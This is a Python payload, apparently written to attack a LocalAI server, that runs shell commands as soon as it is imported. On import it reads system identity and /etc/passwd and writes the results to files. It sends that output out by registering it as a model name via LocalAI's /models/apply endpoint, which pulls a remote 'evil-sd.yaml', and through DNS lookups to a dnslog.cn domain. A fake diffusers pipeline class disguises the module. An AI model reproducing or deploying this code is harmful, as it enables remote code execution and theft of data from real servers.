# rce-by-import v4: import时执行命令,输出通过 LocalAI 自身 API 注册为模型名(外传闭环)
import os, subprocess, base64, threading, json, time, urllib.request

def _pwn():
    try:
        out = subprocess.check_output("id; hostname; uname -a; cat /etc/passwd | head -5", shell=True, timeout=8, stderr=subprocess.STDOUT)
        out_s = out.decode(errors='replace')
        # 写入文件 (多个位置)
        for d in ["/models", "/tmp", "/opt/localai/models"]:
            try:
                with open(f"{d}/PWNED-BYC0DE.txt", "w") as f:
                    f.write(out_s)
            except: pass
        # 核心: 通过 LocalAI API 注册命令输出为模型名 (ZOUT--hex 外传通道)
        b64 = base64.b64encode(out).decode().replace('+','-').replace('/','_').replace('=','')
        name = f"ZZ--{b64[:80]}"
        try:
            req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
                data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=5)
        except: pass
        # DNS 外带
        try:
            dns = "19xlua.dnslog.cn"
            sub = b64[:50]
            urllib.request.urlopen(f"http://{sub}.{dns}", timeout=2)
        except: pass
    except Exception:
        pass

t = threading.Thread(target=_pwn)
t.daemon = True
t.start()

# 兼容性类定义
class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
try:
    from diffusers import DiffusionPipeline
    PwnPipeline = type("PwnPipeline", (DiffusionPipeline,), {})
except Exception:
    pass
